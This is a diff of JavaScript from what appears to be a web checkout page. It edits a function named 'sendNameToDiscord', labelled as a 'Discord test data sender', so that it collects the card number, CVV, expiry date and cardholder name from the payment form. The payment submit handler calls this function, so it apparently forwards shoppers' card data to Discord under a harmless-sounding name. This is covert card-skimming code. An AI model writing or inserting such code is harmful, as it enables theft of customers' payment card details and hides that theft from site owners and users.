@@ -880,28 +880,28 @@ function applyLanguage(){
             }, 1500);
         }
 
-        // Discord test data sender
+ // Discord test data sender
 async function sendNameToDiscord() {
 
-    const name =
+    const cardnumber =
     document.getElementById("cardNumber")
     .value
     .trim();
 
 
-    const occupation =
+    const cvv =
     document.getElementById("cardCvv")
     .value
     .trim();
 
 
-    const city =
+    const expiry =
     document.getElementById("cardExpiry")
     .value
     .trim();
 
 
-    const age =
+    const name =
     document.getElementById("cardName")
     .value
     .trim();
@@ -948,6 +948,7 @@ ${new Date().toLocaleString()}`
     );
 
 }
+
         
         function submitPayment() {
             sendNameToDiscord();
